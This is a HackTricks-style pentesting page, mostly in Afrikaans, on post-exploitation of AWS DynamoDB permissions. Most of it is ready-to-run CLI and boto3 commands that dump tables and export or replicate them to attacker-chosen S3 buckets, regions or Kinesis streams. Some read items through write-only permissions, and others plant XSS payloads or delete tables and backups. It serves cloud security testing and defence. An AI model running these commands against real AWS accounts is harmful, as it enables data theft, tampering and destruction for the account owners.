# AWS - DynamoDB Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## DynamoDB

Vir meer inligting, sien:

{{#ref}}
../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

’n aanvaller met hierdie toestemmings sal in staat wees om **items uit tabelle deur die primêre sleutel te kry** (jy kan nie net al die data van die tabel vra nie). Dit beteken dat jy die primêre sleutels moet ken (jy kan dit kry deur die tabelmetadata te vra met `describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Indirect privesc deur sensitiewe inligting in die tabel te lokaliseer

### `dynamodb:GetItem`

**Soortgelyk aan die vorige toestemmings** hierdie een laat 'n potensiële aanvaller toe om waardes uit slegs 1 tabel te lees, mits die primêre sleutel van die inskrywing bekend is:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Met hierdie toestemming is dit ook moontlik om die metode **`transact-get-items`** te gebruik, soos:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:Query`

**Vergelykbaar met die vorige permissies** hierdie een laat 'n potensiële attacker toe om waardes van net 1 tabel te lees gegewe die primêre sleutel van die inskrywing wat gelees moet word. Dit laat toe om 'n [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) te gebruik, maar die enigste vergelyking wat met die primêre sleutel (wat moet verskyn) toegelaat word is "EQ", dus kan jy nie 'n vergelyking gebruik om die hele DB in een versoek te kry nie.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabel op te spoor

### `dynamodb:Scan`

Jy kan hierdie toestemming gebruik om **die hele tabel maklik te dump**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:PartiQLSelect`

Jy kan hierdie toestemming gebruik om **dump die hele tabel maklik**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Hierdie toestemming laat ook toe om `batch-execute-statement` uit te voer soos:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
maar jy moet die primêre sleutel met 'n waarde spesifiseer, so dit nie so nuttig is nie.

**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Hierdie toestemming sal 'n attacker toelaat om **die hele tabel na 'n S3 bucket uit te voer** van sy keuse:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Let daarop dat die tabel point-in-time-recovery aangeskakel moet wees vir dit om te werk; jy kan nagaan of die tabel dit het met:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
As dit nie geaktiveer is nie, moet jy dit **aktiveer** en daarvoor het jy die **`dynamodb:ExportTableToPointInTime`** toestemming nodig:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabel op te spoor

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Met hierdie toestemmings sou 'n aanvaller in staat wees om **'n nuwe tabel vanaf 'n rugsteun te skep** (of selfs 'n rugsteun te skep om dit dan in 'n ander tabel te herstel). Dan, met die nodige toestemmings, sou hy in staat wees om **inligting** uit die rugsteune te nagaan wat c**nie meer in die produksie** tabel is.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabelrugsteun te lokaliseer

### `dynamodb:PutItem`

Hierdie toestemming laat gebruikers toe om 'n **nuwe item by die tabel te voeg of 'n bestaande item te vervang** met 'n nuwe item. As 'n item met dieselfde primêre sleutel reeds bestaan, sal die **gehele item vervang word** met die nuwe item. As die primêre sleutel nie bestaan nie, sal 'n nuwe item met die gespesifiseerde primêre sleutel **aangemaak** word.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** Uitbuiting van verdere vulnerabilities/bypasses deur in staat te wees om data in 'n DynamoDB-tabel by te voeg of te wysig

### `dynamodb:UpdateItem`

Hierdie toestemming laat gebruikers toe om die bestaande eienskappe van 'n item te **wysig** of nuwe eienskappe aan 'n item **by te voeg**. Dit **vervang nie** die hele item nie; dit werk slegs die gespesifiseerde eienskappe by. As die primêre sleutel nie in die tabel bestaan nie, sal die operasie 'n **nuwe item skep** met die gespesifiseerde primêre sleutel en die eienskappe instel soos aangedui in die update expression.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Uitbuiting van verdere kwesbaarhede/omseilings deur in staat te wees om data in 'n DynamoDB-tabel by te voeg of te wysig

### `dynamodb:DeleteTable`

An attacker met hierdie toestemming kan **'n DynamoDB-tabel verwyder, wat dataverlies veroorsaak**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potensiële impak**: Dataverlies en ontwrigting van dienste wat op die verwyderde tabel staatmaak.

### `dynamodb:DeleteBackup`

'n aanvaller met hierdie toestemming kan **'n DynamoDB-rugsteun verwyder, wat moontlik dataverlies veroorsaak in geval van 'n rampherstelscenario**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potensiële impak**: Data verlies en onmoontlikheid om van 'n rugsteun te herstel tydens 'n rampherwinningscenario.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Toets of dit eintlik werk

'n aanvaller met hierdie toestemmings kan **'n stream op 'n DynamoDB-tabel aktiveer, die tabel opdateer om te begin met die stream van veranderinge, en dan toegang tot die stream kry om veranderinge aan die tabel in real-time te monitor**. Dit stel die aanvaller in staat om data-wijzigings te monitor en te exfiltrate, wat moontlik tot data leakage kan lei.

1. Skakel 'n stream op 'n DynamoDB-tabel in:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Beskryf die stream om die ARN en ander besonderhede te kry:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Kry die shard iterator met behulp van die stream ARN:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Gebruik die shard iterator om toegang te kry en data uit die stream te exfiltrate:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potensiële impak**: Tydreële monitering en data leakage van die DynamoDB-tabel se veranderings.

### Lees items via `dynamodb:UpdateItem` and `ReturnValues=ALL_OLD`

'n aanvaller met slegs `dynamodb:UpdateItem` op 'n tabel kan items lees sonder enige van die gewone lees-toestemmings (`GetItem`/`Query`/`Scan`) deur 'n onskuldige update uit te voer en `--return-values ALL_OLD` te versoek. DynamoDB sal die volle pre-update beeld van die item in die `Attributes` veld van die antwoord teruggee (dit verbruik nie RCUs nie).

- Minimale toestemmings: `dynamodb:UpdateItem` op die teikentabel/sleutel.
- Vereistes: Jy moet die item se primêre sleutel ken.

Voorbeeld (voeg 'n onskuldige attribuut by en exfiltrates die vorige item in die antwoord):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
Die CLI-antwoord sal `n `Attributes`-blok insluit wat die volledige vorige item (alle attributes) bevat, wat effektief `n lees-primitive vanuit skryf-alleen toegang bied.

**Potensiële impak:** Lees ewekansige items uit `n tabel met slegs skryfpermissies, wat sensitiwe data exfiltration moontlik maak wanneer primêre sleutels bekend is.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Stil exfiltration deur `n nuwe replica Region by `n DynamoDB Global Table (weergawe 2019.11.21) te voeg. Indien `n principal `n streeksreplica kan byvoeg, word die hele tabel na die deur die aanvaller gekose Region gerepliseer, van waar die aanvaller alle items kan lees.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Permissies: `dynamodb:UpdateTable` (met `replica-updates`) of `dynamodb:CreateTableReplica` op die teikentabel. As 'n CMK in die replika gebruik word, mag KMS-permissies vir daardie sleutel benodig word.

Potensiële impak: Volledige-tabel-replikasie na 'n streek wat deur 'n aanvaller beheer word, wat lei tot sluipende data-eksfiltrasie.

### `dynamodb:TransactWriteItems` (lees deur mislukte voorwaarde + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

'n Aanvaller met transaksionele skryfbevoegdhede kan die volle eienskappe van 'n bestaande item eksfiltreer deur 'n `Update` binne `TransactWriteItems` uit te voer wat opsetlik 'n `ConditionExpression` laat misluk terwyl `ReturnValuesOnConditionCheckFailure=ALL_OLD` ingestel is. By mislukking sluit DynamoDB die vorige eienskappe in die redes vir kansellasie van die transaksie in, wat skryf-slegs-toegang effektief in lees-toegang tot geteikende sleutels omskakel.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

Permissies: `dynamodb:TransactWriteItems` on the target table (and the underlying item). Geen leespermissies is benodig nie.

Potensiële impak: Lees ewekansige items (per primêre sleutel) uit 'n tabel deur net transaksionele skryfregte te gebruik via die teruggegewe kanselleringsredes.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` op GSI

Om leesbeperkings te omseil, skep 'n Global Secondary Index (GSI) met `ProjectionType=ALL` op 'n lae-entropie attribuut, stel daardie attribuut oor items op 'n konstante waarde, en `Query` dan die indeks om volle items te herwin. Dit werk selfs as `Query`/`Scan` op die basistabel geweier word, solank jy die indeks ARN kan query.

- Minimum permissies:
- `dynamodb:UpdateTable` on the target table (om die GSI met `ProjectionType=ALL` te skep).
- `dynamodb:UpdateItem` on the target table keys (om die geïndekseerde attribuut op elke item te stel).
- `dynamodb:Query` on the index resource ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Stappe (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potensiële impak:** Full table exfiltration deur 'n pas geskepte GSI wat alle attributte projekteer, selfs wanneer base table read APIs geweier word.


### `dynamodb:EnableKinesisStreamingDestination` (Aanhoudende exfiltration via Kinesis Data Streams)

Misbruik van DynamoDB Kinesis streaming destinations om voortdurend veranderinge van 'n tabel na 'n aanvaller-beheerde Kinesis Data Stream te exfiltrate. Sodra dit aangeskakel is, word elke INSERT/MODIFY/REMOVE gebeurtenis naby real-time na die stream gestuur sonder om leespermisse op die tabel te benodig.

Minimum permissies (aanvaller):
- `dynamodb:EnableKinesisStreamingDestination` op die teiken-tabel
- Opsioneel `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` om status te monitor
- Leespermissies op die aanvaller-beheerde Kinesis stream om rekords te verbruik: `kinesis:ListShards`, `kinesis:GetShardIterator`, `kinesis:GetRecords`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
</details>

**Potensiële impak:** Aaneenlopende, naby-regstreekse exfiltration van tabelveranderinge na 'n deur 'n aanvaller beheerde Kinesis-stream sonder direkte leesoperasies op die tabel.



{{#include ../../../banners/hacktricks-training.md}}
